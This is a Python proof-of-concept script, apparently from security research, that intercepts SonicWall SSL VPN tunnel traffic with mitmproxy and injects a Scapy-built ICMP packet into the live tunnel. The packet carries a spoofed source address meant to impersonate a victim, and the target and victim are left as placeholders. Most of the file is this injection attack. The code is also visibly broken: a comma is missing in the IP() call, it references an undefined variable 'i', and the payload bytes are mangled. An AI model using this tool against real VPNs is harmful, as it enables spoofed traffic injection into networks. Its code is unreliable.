#!/bin/env python
# SSL VPN tunnel fuzzer based on mitmproxy and Scapy.
# Copyright (C) 2024 Ta-Lun Yen, TXOne Networks Inc.
#
# This library is free software; you can redistribute it and/or
# modify it under the terms of the GNU Library General Public
# License as published by the Free Software Foundation; either
# version 2 of the License, or (at your option) any later version.
#
# This library is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# Library General Public License for more details.
#
# You should have received a copy of the GNU Library General Public
# License along with this library; if not, see
# <https://www.gnu.org/licenses/>.
import asyncio
from mitmproxy import options
from mitmproxy.tools import dump
from mitmproxy import tcp
from mitmproxy import ctx
from scapy.layers.inet import IP, ICMP

class SonicwallPacket():

    @staticmethod
    def from_frame(b):
        return SonicwallPacket(
            ethertype=b[4:6],
            packet_type=b[8:16],
            payload=b[16:],
            length=b[6:8]
        )

    def __init__(self, payload: str | bytes, ethertype: int | bytes = None, packet_type: int | bytes = None, length: int = None):
        self.payload = payload
        self.magic = b"\x1a\x2b\x3c\x4d"

        self.ethertype = ethertype
        if not ethertype:
            self.ethertype = b"\x08\x00"

        self.packet_type = packet_type
        if not packet_type:
            self.packet_type = b"\x01\x00\x00\x00\x00\x00\x00\x00"

        self.length = length
        if not length:
            self.length = len(payload).to_bytes(length=2, byteorder="big")

    def build(self):
        return self.magic + self.ethertype + self.length + self.packet_type + self.payload

    def __is_keepalive(self):
        return self.packet_type == b"\x00\x00\x00\x00\x00\x00\x00\x00"

    def __repr__(self):
        rep = "<SonicwallPacket (len {}, ethertype {}".format(self.length.hex(), self.ethertype.hex())
        if self.__is_keepalive():
            rep = rep + ", keepalive)"
        if not self.__is_keepalive():
            rep = rep + ") " + self.payload.hex()
        rep = rep + " >"
        return rep


class RequestLogger:
    def __init__(self):
        self.sent = False
        self.ctr = 0
        self.start_drop = False

    def responseheaders(self, flow):
        flow.request.stream = True

    def tcp_message(self, flow: tcp.TCPFlow):
        last_msg = flow.messages[-1]

        direction = "<-"
        if last_msg.from_client:
            direction = "->"

        print(flow, direction, last_msg.content)

        if not self.sent and len(flow.messages) > 18:
            self.sent = True
            icmp_payload = b"""gS\x1dd\x00\x00\x00\x00\xcc\x0c\x08\x00\x00\x00\
                \x00\x00\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\\
                x1c\x1d\x1e\x1f !"#$%&\'()*+,-./blaidd0"""
            payload = IP(
                dst="dst_address" # change to target
                src="src_address".format(i), # change to spoof victim
                flags="DF",
                version=4,
                ihl=5,
                tos=0,
                frag=0,
                ttl=64)/ICMP(
                type="echo-request"
            )/icmp_payload

            payload = payload.build()
            length = len(payload) + 9
            length = length.to_bytes(length=2, byteorder="big")

            result = b"\x00\x00" + length + b"\x7e\xff\x03\x00\x21" + payload
            ctx.master.commands.call(
                "inject.tcp", flow, False, result
            )


async def start_proxy(host):
    opts = options.Options(
        certs=["*=../cert.pem"],
        mode=["wireguard:../wgk.conf@31338"],
        ssl_insecure=True,
        http2=True
    )

    master = dump.DumpMaster(
        opts,
        with_termlog=False,
        with_dumper=False
    )
    master.addons.add(RequestLogger())

    await master.run()
    return master

if __name__ == '__main__':
    tgt_ip = "<target ssl vpn IP>"
    host=tgt_ip
    asyncio.run(start_proxy(host))
